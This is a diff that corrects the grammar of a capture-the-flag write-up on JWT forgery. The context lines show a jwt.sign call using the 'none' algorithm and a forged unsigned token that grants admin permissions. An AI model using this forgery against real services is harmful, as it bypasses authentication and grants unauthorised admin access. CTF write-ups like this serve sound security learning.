@@ -232,9 +232,9 @@ app.use((req, res, next) => {
 
 I didn't managed to end this challenge. A friend gave me a tip after the end of the CTF.
 
-First we can see that that is again a JWT forgery challenge. 
-We quicly understant that we need to craft a jwt with a admin perms. 
-To test, I use this code :
+First we can see that this is again a JWT forgery challenge. 
+We quicly understand that we need to craft a jwt with a admin perms. 
+To test, I used this code :
 ```javascript
     let secrets = [];
     secrets.push(crypto.randomBytes(32)); //fill it a bit
@@ -292,8 +292,8 @@ let cookie = jwt.sign({
         rolled: "no"
       }, crypto.randomBytes(32), { algorithm: "none"  });
 ```
+It is a  WIN !
 
-and testing it: it is a  WIN !
 The cookie to set : 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJwZXJtcyI6ImFkbWluIiwic2VjcmV0aWQiOiJhIiwicm9sbGVkIjoibm8iLCJpYXQiOjE2MDYxNDAyMTl9.'
 
 
